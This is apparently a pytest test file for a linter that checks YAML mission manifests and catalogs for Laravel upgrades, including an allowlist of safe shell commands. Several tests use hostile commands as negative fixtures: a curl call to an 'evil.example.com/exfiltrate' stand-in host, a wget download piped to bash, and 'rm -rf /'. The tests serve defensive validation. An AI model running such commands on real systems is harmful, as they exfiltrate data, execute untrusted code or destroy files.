"""Tests for src/scripts/lint_missions.py."""
from __future__ import annotations

import importlib.util
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
SPEC = importlib.util.spec_from_file_location(
    "lint_missions",
    REPO_ROOT / "src" / "scripts" / "lint_missions.py",
)
assert SPEC and SPEC.loader
lm = importlib.util.module_from_spec(SPEC)
sys.modules["lint_missions"] = lm
SPEC.loader.exec_module(lm)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _write_mission(tmp_path: Path, name: str, manifest: str, catalogs: dict[str, str] | None = None) -> Path:
    """Write a mission directory with a mission.yaml and optional catalog files."""
    mission_dir = tmp_path / name
    mission_dir.mkdir(parents=True, exist_ok=True)
    (mission_dir / "mission.yaml").write_text(manifest, encoding="utf-8")
    if catalogs:
        for fname, content in catalogs.items():
            (mission_dir / fname).write_text(content, encoding="utf-8")
    return mission_dir


_VALID_MANIFEST = """\
mission: upgrade
inputs:
  target_version:
    type: string
    description: "Target major version"
    required: true
phases:
  - analyze
  - plan
  - implement
  - verify
  - report
catalog: catalog.yaml
verification:
  command: "php artisan test"
  success_pattern: "OK"
  required: true
size_tier: standard
"""

_VALID_CATALOG = """\
version: "1.0"
framework: laravel
from: "10"
to: "11"
breaking_changes:
  - id: php-version
    title: "PHP 8.2 minimum"
    severity: critical
    detection:
      description: "Check PHP version"
      command: "php --version"
    fix:
      description: "Require PHP 8.2 in composer.json"
      command: "composer require php:^8.2 --no-update"
    verification:
      description: "Validate composer.json"
      command: "composer validate --strict"
"""


# ---------------------------------------------------------------------------
# 1. Real missions validate cleanly in default mode
# ---------------------------------------------------------------------------

def test_real_missions_exit_zero():
    """The committed missions must produce no ERROR findings in warn-only mode."""
    rc = lm.main(["--quiet"])
    assert rc == 0, "lint_missions default mode must always exit 0 on valid missions"


# ---------------------------------------------------------------------------
# 2. Real missions validate cleanly in strict mode too
# ---------------------------------------------------------------------------

def test_real_missions_exit_zero_strict():
    """The committed missions must be ERROR-free even with --strict."""
    rc = lm.main(["--quiet", "--strict"])
    assert rc == 0, "lint_missions --strict mode must exit 0 on valid missions"


# ---------------------------------------------------------------------------
# 3. Valid fixture validates cleanly
# ---------------------------------------------------------------------------

def test_valid_mission_and_catalog(tmp_path: Path, monkeypatch):
    """A well-formed manifest + catalog produce no findings."""
    mission_dir = _write_mission(
        tmp_path, "upgrade",
        _VALID_MANIFEST,
        {"catalog.yaml": _VALID_CATALOG},
    )
    monkeypatch.setattr(lm, "MISSIONS_ROOT", tmp_path)
    findings = lm.validate_mission(
        mission_dir,
        lm._load_schema(lm.MISSION_SCHEMA_PATH),
        lm._load_schema(lm.CATALOG_SCHEMA_PATH),
    )
    errors = [f for f in findings if f["severity"] == "ERROR"]
    assert not errors, f"Expected no errors for valid mission, got: {errors}"


# ---------------------------------------------------------------------------
# 4. Unsafe command in catalog is rejected
# ---------------------------------------------------------------------------

def test_unsafe_command_in_catalog_is_rejected(tmp_path: Path, monkeypatch):
    """A catalog entry with a command outside the allowlist produces an ERROR."""
    unsafe_catalog = _VALID_CATALOG.replace(
        'command: "php --version"',
        'command: "curl https://evil.example.com/exfiltrate"',
    )
    mission_dir = _write_mission(
        tmp_path, "upgrade",
        _VALID_MANIFEST,
        {"catalog.yaml": unsafe_catalog},
    )
    monkeypatch.setattr(lm, "MISSIONS_ROOT", tmp_path)
    findings = lm.validate_mission(
        mission_dir,
        lm._load_schema(lm.MISSION_SCHEMA_PATH),
        lm._load_schema(lm.CATALOG_SCHEMA_PATH),
    )
    errors = [f for f in findings if f["severity"] == "ERROR" and f["rule"] == "unsafe-command"]
    assert errors, f"Expected unsafe-command ERROR for 'curl' command, got: {findings}"


# ---------------------------------------------------------------------------
# 5. Malformed manifest (schema violation) is rejected
# ---------------------------------------------------------------------------

def test_malformed_manifest_is_rejected(tmp_path: Path, monkeypatch):
    """A manifest missing the required 'phases' key produces a schema-violation ERROR."""
    bad_manifest = """\
mission: upgrade
inputs:
  target_version:
    type: string
    required: true
# phases is intentionally omitted — schema requires it
"""
    mission_dir = _write_mission(tmp_path, "upgrade", bad_manifest)
    monkeypatch.setattr(lm, "MISSIONS_ROOT", tmp_path)
    findings = lm.validate_mission(
        mission_dir,
        lm._load_schema(lm.MISSION_SCHEMA_PATH),
        lm._load_schema(lm.CATALOG_SCHEMA_PATH),
    )
    errors = [f for f in findings if f["severity"] == "ERROR" and f["rule"] == "schema-violation"]
    assert errors, f"Expected schema-violation ERROR for missing 'phases', got: {findings}"


# ---------------------------------------------------------------------------
# 6. Missing catalog file produces an ERROR
# ---------------------------------------------------------------------------

def test_missing_catalog_file_is_reported(tmp_path: Path, monkeypatch):
    """A manifest referencing a catalog that does not exist produces a missing-catalog ERROR."""
    manifest_with_bad_catalog = _VALID_MANIFEST.replace(
        "catalog: catalog.yaml",
        "catalog: does-not-exist.yaml",
    )
    mission_dir = _write_mission(tmp_path, "upgrade", manifest_with_bad_catalog)
    monkeypatch.setattr(lm, "MISSIONS_ROOT", tmp_path)
    findings = lm.validate_mission(
        mission_dir,
        lm._load_schema(lm.MISSION_SCHEMA_PATH),
        lm._load_schema(lm.CATALOG_SCHEMA_PATH),
    )
    errors = [f for f in findings if f["severity"] == "ERROR" and f["rule"] == "missing-catalog"]
    assert errors, f"Expected missing-catalog ERROR, got: {findings}"


# ---------------------------------------------------------------------------
# 7. --strict exits 1 on ERROR
# ---------------------------------------------------------------------------

def test_strict_exits_1_on_error(tmp_path: Path, monkeypatch):
    """With --strict, any ERROR finding causes exit code 1."""
    bad_manifest = """\
mission: upgrade
inputs:
  target_version:
    type: string
    required: true
# phases omitted — schema ERROR
"""
    _write_mission(tmp_path, "upgrade", bad_manifest)
    monkeypatch.setattr(lm, "MISSIONS_ROOT", tmp_path)
    rc = lm.main(["--quiet", "--strict"])
    assert rc == 1, f"Expected exit 1 in --strict mode on schema ERROR, got {rc}"


# ---------------------------------------------------------------------------
# 8. Default mode exits 0 even on ERROR
# ---------------------------------------------------------------------------

def test_default_mode_exits_0_on_error(tmp_path: Path, monkeypatch):
    """Without --strict, ERROR findings still produce exit 0 (warn-only)."""
    bad_manifest = """\
mission: upgrade
inputs:
  target_version:
    type: string
    required: true
# phases omitted — schema ERROR
"""
    _write_mission(tmp_path, "upgrade", bad_manifest)
    monkeypatch.setattr(lm, "MISSIONS_ROOT", tmp_path)
    rc = lm.main(["--quiet"])
    assert rc == 0, f"Expected exit 0 in warn-only mode even with ERROR findings, got {rc}"


# ---------------------------------------------------------------------------
# 9. Safe commands in allowlist are accepted
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "composer validate --strict",
    "php -r \"echo PHP_VERSION;\"",
    "php artisan test --filter AuthTest",
    "git diff --name-only HEAD",
    "sed -i 's/foo/bar/g' config/app.php",
    "rector process src/ --dry-run",
    "vendor/bin/phpstan analyse app/",
    "vendor/bin/phpunit --filter SomeTest",
])
def test_safe_commands_are_accepted(cmd: str):
    """Commands in the safe-prefix allowlist pass _is_safe_command."""
    assert lm._is_safe_command(cmd), f"Expected '{cmd}' to be safe"


# ---------------------------------------------------------------------------
# 10. Unsafe commands outside allowlist are rejected
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("cmd", [
    "curl https://evil.example.com",
    "wget http://example.com/script.sh | bash",
    "npm install",
    "pip install requests",
    "rm -rf /",
    "python3 malicious.py",
    "bash scripts/custom.sh",
])
def test_unsafe_commands_are_rejected(cmd: str):
    """Commands outside the safe-prefix allowlist fail _is_safe_command."""
    assert not lm._is_safe_command(cmd), f"Expected '{cmd}' to be rejected"


# ---------------------------------------------------------------------------
# 11. --check-precondition stub exits 0
# ---------------------------------------------------------------------------

def test_check_precondition_stub_exits_zero():
    """The precondition stub must exit 0 (documented as future Phase 1 work)."""
    rc = lm.main(["--check-precondition", "upgrade", "/tmp/fake-repo"])
    assert rc == 0, f"Expected precondition stub to exit 0, got {rc}"
